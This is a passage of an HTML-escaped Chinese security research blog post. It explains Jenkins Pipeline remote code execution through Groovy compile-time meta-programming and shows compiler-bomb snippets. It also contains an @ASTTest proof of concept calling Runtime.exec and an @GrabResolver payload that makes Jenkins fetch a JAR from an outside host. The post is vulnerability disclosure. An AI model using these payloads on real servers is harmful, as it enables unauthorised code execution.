  &lt;li&gt;Ruby (Ruby 本身就是一門將 Meta-Programming 發揮到極致的語言，甚至還有專門的&lt;a href=&quot;http://shop.oreilly.com/product/9781934356470.do&quot;&gt;書1&lt;/a&gt;, &lt;a href=&quot;http://shop.oreilly.com/product/9781941222126.do&quot;&gt;書2&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;Java 的 Annotation 註解&lt;/li&gt;
  &lt;li&gt;各種 DSL(Domain Specific Language) 應用，例如 &lt;a href=&quot;http://sinatrarb.com/&quot;&gt;Sinatra&lt;/a&gt; 及 &lt;a href=&quot;https://gradle.org/&quot;&gt;Gradle&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;而當我們在談論 Meta-Programming 時，依照作用的範圍我們大致分成 &lt;strong&gt;(1)編譯時期&lt;/strong&gt; 及 &lt;strong&gt;(2)執行時期&lt;/strong&gt;這兩種 Meta-Programming! 而我們今天的重點，就是在編譯時期的 Meta-Programming!&lt;/p&gt;

&lt;p&gt;&lt;em&gt;P.S. 我也不是一位 Programming Language 大師，如有不精確或者覺得教壞小朋友的地方再請多多包涵 &amp;lt;(_ _)&amp;gt;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;如何利用&quot;&gt;如何利用&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;從前面的段落中我們發現 Jenkins 使用 &lt;a href=&quot;http://docs.groovy-lang.org/latest/html/api/groovy/lang/GroovyClassLoader.html#parseClass-java.lang.String-&quot;&gt;parseClass(…)&lt;/a&gt; 去檢查語法錯誤，我們也想起了 Meta-Programming 可在編譯時期對程式碼做一些動態的操作! 設計一個編譯器(或解析器)是一件很麻煩的事情，裡面會有各種骯髒的實作或是奇怪的功能，所以一個很直覺的想法就是，是否可以透過編譯器一些副作用(Side Effect)去完成一些事情呢?&lt;/p&gt;

&lt;p&gt;舉幾個淺顯易懂的例子，如 C 語言巨集擴展所造成的資源耗盡&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define a 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1
#define b a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a
#define c b,b,b,b,b,b,b,b,b,b,b,b,b,b,b,b
#define d c,c,c,c,c,c,c,c,c,c,c,c,c,c,c,c
#define e d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d
#define f e,e,e,e,e,e,e,e,e,e,e,e,e,e,e,e
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__int128&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;編譯器的資源耗盡(用 18 bytes 產生 16G 的執行檔)&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;或是用編譯器來幫你算費式數列&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 55&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 6765&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 102334155&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;從組合語言的結果可以看出這些值在編譯期間就被計算好填充進去，而不是執行期間!&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;g++ template.cpp &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; template
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objdump &lt;span class=&quot;nt&quot;&gt;-M&lt;/span&gt; intel &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; template
...
00000000000005fa &amp;lt;main&amp;gt;:
 5fa:   55                      push   rbp
 5fb:   48 89 e5                mov    rbp,rsp
 5fe:   c7 45 f4 37 00 00 00    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0xc],0x37
 605:   c7 45 f8 6d 1a 00 00    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x8],0x1a6d
 60c:   c7 45 &lt;span class=&quot;nb&quot;&gt;fc &lt;/span&gt;cb 7e 19 06    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x4],0x6197ecb
 613:   b8 00 00 00 00          mov    eax,0x0
 618:   5d                      pop    rbp
 619:   c3                      ret
 61a:   66 0f 1f 44 00 00       nop    WORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rax+rax&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;1+0x0]
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;更多的例子你可以參考 StackOverflow 上的 &lt;a href=&quot;https://codegolf.stackexchange.com/questions/69189/build-a-compiler-bomb&quot;&gt;Build a Compiler Bomb&lt;/a&gt; 這篇文章!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;首次嘗試&quot;&gt;首次嘗試&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;回到我們的漏洞利用上，Pipeline 是基於 Groovy 上的一個 DSL 實作，而 Groovy 剛好就是一門對於 Meta-Programming 非常友善的語言! 翻閱著 Grovvy 官方的 &lt;a href=&quot;http://groovy-lang.org/metaprogramming.html&quot;&gt;Meta-Programming 手冊&lt;/a&gt; 開始尋找各種可以利用的方法! 在 2.1.9 章「測試協助」這個段落發現了 &lt;code class=&quot;highlighter-rouge&quot;&gt;@groovy.transform.ASTTest&lt;/code&gt; 這個註解，仔細觀察它的敘述:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;@ASTTest&lt;/code&gt; is a special AST transformation meant to help debugging other AST transformations or the Groovy compiler itself. It will let the developer “explore” the AST during compilation and &lt;strong&gt;perform assertions on the AST&lt;/strong&gt; rather than on the result of compilation. This means that this AST transformations gives access to the AST before the bytecode is produced. &lt;code class=&quot;highlighter-rouge&quot;&gt;@ASTTest&lt;/code&gt; can be placed on any annotable node and requires two parameters:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;什麼! 可以在 AST 上執行一個 assertion? 這不就是我們要的嗎? 趕緊先在本地寫個 Proof-of-Concept 嘗試是否可行:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;classLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&#39;&#39;
@groovy.transform.ASTTest(value={
    assert java.lang.Runtime.getRuntime().exec(&quot;touch pwned&quot;)
})
def x
&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;poc.groovy

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;groovy poc.groovy
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;poc.groovy  pwned
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;幹，可以欸! 但代誌並不是憨人想的那麼簡單! 嘗試在遠端 Jenkins 重現時，出現了:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;unable to resolve class org.jenkinsci.plugins.workflow.libs.Library&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190219/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;真是黑人問號，森77，這到底是三小啦!!!&lt;/p&gt;

&lt;p&gt;認真追了一下 root cause 才發現是 &lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Pipeline+Shared+Groovy+Libraries+Plugin&quot;&gt;Pipeline Shared Groovy Libraries Plugin&lt;/a&gt; 這個插件在作怪! 為了方便使用者可重複使用在編寫 Pipeline 常用到的功能，Jenkins 提供了這個插件可在 Pipeline 中引入自定義的函式庫! Jenkins 會在所有 Pipeline 執行前引入這個函式庫，而在編譯時期的 classPath 中並沒有相對應的函式庫因而導致了這個錯誤!&lt;/p&gt;

&lt;p&gt;想解決這個問題很簡單，到 &lt;a href=&quot;http://jenkins.local/pluginManager/&quot;&gt;Jenkins Plugin Manager&lt;/a&gt; 中將 &lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Pipeline+Shared+Groovy+Libraries+Plugin&quot;&gt;Pipeline Shared Groovy Libraries Plugin&lt;/a&gt; 移除即可解決這個問題並執行任意代碼!&lt;/p&gt;

&lt;p&gt;不過這絕對不是最佳解! 這個插件會隨著 Pipeline 被自動安裝，為了要成功利用這個漏洞還得先要求管理員把它移除實在太蠢了! 因此這條路只能先打住，繼續尋找下一個方法!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;再次嘗試&quot;&gt;再次嘗試&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;繼續閱讀 &lt;a href=&quot;http://groovy-lang.org/metaprogramming.html&quot;&gt;Groovy Meta-Programming 手冊&lt;/a&gt;，我們發現了另一個有趣的註解 &lt;code class=&quot;highlighter-rouge&quot;&gt;@Grab&lt;/code&gt;，關於 &lt;code class=&quot;highlighter-rouge&quot;&gt;@Grab&lt;/code&gt; 手冊中並沒有詳細的描述，但使用 Google 我們發現了另一篇文章 - &lt;a href=&quot;http://docs.groovy-lang.org/latest/html/documentation/grape.html&quot;&gt;Dependency management with Grape&lt;/a&gt;!&lt;/p&gt;

&lt;p&gt;原來 Grape(&lt;code class=&quot;highlighter-rouge&quot;&gt;@Grab&lt;/code&gt;) 是一個 Groovy 內建的動態 JAR 相依性管理程式! 可讓開發者動態的引入不在 classPath 上的函式庫! Grape 的語法如下:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nd&quot;&gt;@Grab&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;org.springframework&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;spring-orm&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;3.2.5.RELEASE&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.jdbc.core.JdbcTemplate&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;配合 &lt;code class=&quot;highlighter-rouge&quot;&gt;@grab&lt;/code&gt; 的註解，可讓 Groovy 在編譯時期自動引入不存在於 classPath 中的 JAR 檔! 但如果你的目的只是要在一個有執行 Pipeline 權限的帳號上繞過原有 Pipeline 的 Sandbox 的話，這其實就足夠了! 例如你可以參考 &lt;a href=&quot;https://github.com/adamyordan&quot;&gt;@adamyordan&lt;/a&gt; 所提供的 &lt;a href=&quot;https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc&quot;&gt;PoC&lt;/a&gt;，在已知使用者帳號與密碼及權限足夠的情況下，達到遠端代碼執行的效果!&lt;/p&gt;

&lt;p&gt;但在沒有帳號密碼及 &lt;code class=&quot;highlighter-rouge&quot;&gt;execute()&lt;/code&gt; 的方法下，這只是一個簡單的語法樹解析器，你甚至無法控制遠端伺服器上的檔案，所以該怎麼辦呢? 我們繼續研究下去，並發現了一個很有趣的註解叫做 &lt;code class=&quot;highlighter-rouge&quot;&gt;@GrabResolver&lt;/code&gt;，用法如下:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nd&quot;&gt;@GrabResolver&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;restlet&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;http://maven.restlet.org/&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nd&quot;&gt;@Grab&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;org.restlet&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;org.restlet&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;1.1.6&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.restlet&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;看到這個，聰明的你應該會很想把 &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; 改成惡意網址對吧! 我們來試試會怎麼樣吧!&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;classLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&#39;&#39;
@GrabResolver(name=&#39;restlet&#39;, root=&#39;http://orange.tw/&#39;)
@Grab(group=&#39;org.restlet&#39;, module=&#39;org.restlet&#39;, version=&#39;1.1.6&#39;)
import org.restlet
&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;pre&gt;&lt;code class=&quot;language-log&quot;&gt;11.22.33.44 - - [18/Dec/2018:18:56:54 +0800] &quot;HEAD /org/restlet/org.restlet/1.1.6/org.restlet-1.1.6-javadoc.jar HTTP/1.1&quot; 404 185 &quot;-&quot; &quot;Apache Ivy/2.4.0&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;喔幹，真的會來存取欸! 到這裡我們已經確信了透過 Grape 可以讓 Jenkins 引入惡意的函式庫! 但下一個問題是，要如何執行代碼呢?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;如何執行任意代碼&quot;&gt;如何執行任意代碼?&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;在漏洞的利用中總是在研究如何從簡單的任意讀、任意寫到取得系統執行的權限! 從前面的例子中，我們已經可以透過 Grape 去寫入惡意的 JAR 檔到遠端伺服器，但要怎麼執行這個 JAR 檔呢? 這又是另一個問題!&lt;/p&gt;

&lt;p&gt;跟進 Groovy 語言核心查看對於 &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/master/src/main/groovy/grape/Grape.java&quot;&gt;Grape 的實作&lt;/a&gt;，我們知道網路層的抓取是透過 &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/master/src/main/groovy/grape/GrapeIvy.groovy&quot;&gt;groovy.grape.GrapeIvy&lt;/a&gt; 這個類別來完成! 所以開始尋找實作中是否有任何可以執行代碼的機會! 其中，我們看到了一個有趣的方法 - &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L312&quot;&gt;processOtherServices(…)&lt;/a&gt;:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;processOtherServices&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ClassLoader&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ZipFile&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ZipFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ZipEntry&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serializedCategoryMethods&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;META-INF/services/org.codehaus.groovy.runtime.SerializedCategoryMethods&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serializedCategoryMethods&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
